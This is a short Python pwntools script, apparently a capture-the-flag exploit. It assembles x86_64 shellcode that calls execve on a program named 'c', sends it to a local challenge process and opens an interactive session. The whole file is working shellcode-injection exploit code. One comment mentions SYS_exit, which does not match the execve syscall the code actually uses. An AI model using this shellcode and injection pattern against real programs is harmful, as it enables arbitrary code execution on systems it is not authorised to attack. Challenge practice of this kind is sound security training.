import glob
from pwn import *

context.arch = "x86_64"
#context.log_level = "DEBUG"

# nop_sleed = "nop\n" * 900

# pwntools will change SYS_exit to the respective syscall
assembly = """
jmp executable
main:
	pop rdi
	xor esi, esi
	xor edx, edx
	push 59
	pop rax
	syscall
executable:
    call main
	.ascii "c"
"""

shellcode = asm(assembly)
p = process(glob.glob('/4'))
print(p.recv(timeout=2).decode())
p.send(shellcode)
p.interactive()
print(disasm(shellcode))